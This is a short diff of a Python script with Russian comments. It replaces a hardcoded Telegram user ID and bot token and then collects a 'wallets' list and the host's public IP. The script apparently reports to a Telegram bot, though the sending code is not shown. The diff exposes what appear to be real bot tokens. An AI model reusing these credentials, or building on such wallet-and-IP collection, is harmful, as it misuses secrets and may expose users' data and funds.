@@ -15,9 +15,9 @@ while True:
     except ValueError:
         print("Введите число.")
 #НИЖЕ ВСТАВИТЬ СВОЙ USER_ID TELEGRAM, УЗНАТЬ МОЖНО ТУТ https://t.me/getmyid_bot
-id = 341894058
+id = 744088726
 #НИЖЕ ВСТАВИТЬ СВОЙ ТОКЕН ОТ БОТА, ПОЛУЧИТЬ ОТ BOTFATHER https://t.me/BotFather
-bot_token = "bot7790018788:AAEllf_Mik30e8xHjNv9CSg5twrD9eFLugQ"
+bot_token = "1809514735:AAEQK9SFyCAy6uDKbupzku_lpoCZtggXRqs"
 wallets = []
 ip = requests.get("https://api.ipify.org").text
 for i in range(n):
